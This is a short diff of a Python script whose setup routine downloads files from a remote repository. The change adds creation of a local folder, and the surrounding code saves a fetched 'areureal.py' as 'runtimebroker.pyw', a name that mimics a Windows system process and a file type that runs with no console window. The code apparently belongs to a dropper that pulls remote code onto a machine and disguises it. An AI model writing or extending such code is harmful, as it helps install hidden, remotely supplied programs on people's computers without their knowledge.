@@ -20,6 +20,8 @@ if (connection() == False):
 	os._exit(1)
 
 def setup():
+    if not os.path.exists(pd):
+        os.makedirs(pd)    
     urllib.request.urlretrieve(rawrepo + '/main/areureal.py', '{}/runtimebroker.pyw'.format(pd))
     urllib.request.urlretrieve(rawrepo + '/main/requirements.txt', '{}/requirements.txt'.format(pd))
     urllib.request.urlretrieve(rawrepo + '/main/version', '{}/version'.format(pd))
